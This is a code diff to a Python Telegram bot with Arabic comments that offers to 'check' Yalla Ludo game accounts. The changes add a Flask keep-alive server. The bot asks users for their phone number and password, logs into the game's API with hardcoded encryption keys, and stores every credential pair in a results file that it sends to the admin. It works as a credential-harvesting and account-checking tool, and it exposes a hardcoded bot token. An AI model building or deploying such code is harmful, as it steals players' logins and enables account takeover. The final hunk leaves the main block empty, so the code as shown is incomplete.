@@ -5,18 +5,28 @@ from telebot import types, apihelper
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from datetime import datetime
+from flask import Flask
+import threading
 
 # ==================== إعدادات البوت ====================
 BOT_TOKEN = "8120776454:AAGS0cdTX1z--z9XLt01WmTToMOT8uYvvLg"
 ADMIN_ID = 8557481747
 
-# ==================== إزالة البروكسي ====================
-# تم إزالة إعدادات البروكسي بالكامل
-# البوت الآن يتصل مباشرة بدون بروكسي
+# ==================== إنشاء تطبيق Flask ====================
+app = Flask(__name__)
 
+@app.route('/')
+def home():
+    return "🚀 بوت Yalla Ludo يعمل 24/7"
+
+@app.route('/health')
+def health():
+    return "✅ Bot is running"
+
+# ==================== إعدادات البوت ====================
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ==================== إعدادات حفظ البيانات ====================
+# ==================== دوال حفظ البيانات ====================
 RESULTS_FILE = "check_results.txt"
 USERS_FILE = "users_ids.txt"
 
@@ -109,7 +119,7 @@ def send_admin_notification(user_id, username, mobile, password, result_data):
     except Exception as e:
         print(f"خطأ في إرسال الإشعار: {e}")
 
-# ==================== دوال التشفير (من السكربت الأصلي) ====================
+# ==================== دوال التشفير ====================
 b1key   = b'4e82797b276c5cb729db62aaa229a057'
 b1iv    = b'0102030405060708'
 secret  = 'L3)qk*@8'
@@ -329,38 +339,26 @@ def getinfo(token, uid, account):
 
 # ==================== دوال البوت ====================
 def check_account(mobile, password):
-    """فحص الحساب"""
     try:
-        # تسجيل الدخول
         lg = login(mobile, password)
-        
         if lg.get('status') != 0:
             return {'status': lg.get('status'), 'tips': lg.get('tips', 'فشل تسجيل الدخول')}
-        
         d = lg['data']
         token = d['token']
         uid = d['id']
-        
-        # جلب المعلومات
         result = getinfo(token, uid, uid)
-        
         if result.get('status') != 0:
             return {'status': result.get('status'), 'tips': result.get('tips', 'فشل جلب المعلومات')}
-        
         return result
-        
     except Exception as e:
         return {'status': -1, 'tips': str(e)}
 
 def format_result(result, mobile, password):
-    """تنسيق النتيجة للعرض"""
     if result.get('status') != 0:
         return f"❌ فشل: {result.get('tips', 'خطأ غير معروف')}"
-    
     data = result.get('data', {})
     base = data.get('baseInfo', {})
     game = data.get('gameInfo', {})
-    
     text = f"📊 <b>معلومات الحساب</b>\n"
     text += f"{'─' * 30}\n"
     text += f"📱 <b>الرقم:</b> {mobile}\n"
@@ -378,7 +376,6 @@ def format_result(result, mobile, password):
     text += f"🏅 <b>الميداليات:</b> {len(data.get('medalList', []))}\n"
     text += f"{'─' * 30}\n"
     text += f"👨‍💻 <b>by</b> @devil_2M"
-    
     return text
 
 # ==================== أوامر البوت ====================
@@ -387,21 +384,17 @@ def start_command(message):
     user_id = message.from_user.id
     username = message.from_user.username
     first_name = message.from_user.first_name
-    
     save_user(user_id, username, first_name)
-    
     markup = types.InlineKeyboardMarkup(row_width=1)
     btn_check = types.InlineKeyboardButton("🔍 فحص حساب", callback_data="check")
     btn_dev = types.InlineKeyboardButton("👨‍💻 المطور", url="https://t.me/devil_2M")
     markup.add(btn_check, btn_dev)
-    
     welcome_text = (
         f"🎲 <b>بوت فحص حسابات Yalla Ludo</b>\n\n"
         f"👋 أهلاً بك <b>{first_name}</b>!\n\n"
         f"هذا البوت يفحص حسابات Yalla Ludo ويعرض معلوماتها.\n\n"
         f"اضغط على زر <b>'فحص حساب'</b> واتبع التعليمات."
     )
-    
     bot.send_message(message.chat.id, welcome_text, parse_mode="HTML", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
@@ -412,33 +405,22 @@ def callback_handler(call):
 
 def get_mobile(message):
     mobile = message.text.strip()
-    
     if not mobile:
         bot.reply_to(message, "❌ الرجاء إدخال رقم صحيح.")
         return
-    
     msg = bot.send_message(message.chat.id, "🔑 <b>أرسل كلمة المرور:</b>", parse_mode="HTML")
     bot.register_next_step_handler(msg, lambda m: get_password(m, mobile))
 
 def get_password(message, mobile):
     password = message.text.strip()
-    
     if not password:
         bot.reply_to(message, "❌ الرجاء إدخال كلمة مرور صحيحة.")
         return
-    
-    # إرسال رسالة انتظار
     wait_msg = bot.reply_to(message, "⏳ جاري فحص الحساب...")
-    
-    # فحص الحساب
     result = check_account(mobile, password)
-    
-    # حفظ النتيجة
     user_id = message.from_user.id
     username = message.from_user.username
     save_result(user_id, username, mobile, password, result)
-    
-    # عرض النتيجة
     if result.get('status') == 0:
         text = format_result(result, mobile, password)
         bot.edit_message_text(text, chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")
@@ -455,24 +437,19 @@ def users_command(message):
     if message.from_user.id != ADMIN_ID:
         bot.reply_to(message, "❌ هذا الأمر خاص بالأدمن فقط.")
         return
-    
     try:
         with open(USERS_FILE, 'r', encoding='utf-8') as f:
             content = f.read()
-        
         users = [line for line in content.split('\n') if line and not line.startswith('#')]
         count = len(users)
-        
         text = f"📊 <b>إحصائيات المستخدمين</b>\n"
         text += f"{'─' * 30}\n"
         text += f"👥 عدد المستخدمين: <b>{count}</b>\n"
         text += f"{'─' * 30}\n\n"
-        
         if users:
             text += "<b>آخر 10 مستخدمين:</b>\n"
             for user in users[-10:]:
                 text += f"• {user}\n"
-        
         bot.reply_to(message, text, parse_mode="HTML")
     except Exception as e:
         bot.reply_to(message, f"❌ خطأ: {e}")
@@ -482,7 +459,6 @@ def results_command(message):
     if message.from_user.id != ADMIN_ID:
         bot.reply_to(message, "❌ هذا الأمر خاص بالأدمن فقط.")
         return
-    
     try:
         with open(RESULTS_FILE, 'rb') as f:
             bot.send_document(
@@ -498,38 +474,25 @@ def stats_command(message):
     if message.from_user.id != ADMIN_ID:
         bot.reply_to(message, "❌ هذا الأمر خاص بالأدمن فقط.")
         return
-    
     try:
         with open(RESULTS_FILE, 'r', encoding='utf-8') as f:
             content = f.read()
-        
         checks = [line for line in content.split('\n') if line.startswith('📅')]
         count = len(checks)
-        
-        # حساب عدد النجاحات والفشل
         success = content.count('✅')
         failed = content.count('❌')
-        
         text = f"📊 <b>إحصائيات الفحوصات</b>\n"
         text += f"{'─' * 30}\n"
         text += f"📝 عدد الفحوصات: <b>{count}</b>\n"
         text += f"✅ النجاح: <b>{success}</b>\n"
         text += f"❌ الفشل: <b>{failed}</b>\n"
-        
         bot.reply_to(message, text, parse_mode="HTML")
     except Exception as e:
         bot.reply_to(message, f"❌ خطأ: {e}")
 
 # ==================== تشغيل البوت ====================
+def run_bot():
+    bot.infinity_polling(timeout=60)
+
 if __name__ == "__main__":
-    print("🚀 بوت فحص حسابات Yalla Ludo يعمل...")
-    print("="*50)
-    print("🌐 بدون بروكسي - اتصال مباشر")
-    print(f"📁 حفظ المستخدمين في: {USERS_FILE}")
-    print(f"📁 حفظ النتائج في: {RESULTS_FILE}")
-    print("="*50)
     
-    try:
-        bot.infinity_polling(timeout=60)
-    except Exception as e:
-        print(f"❌ خطأ: {e}")
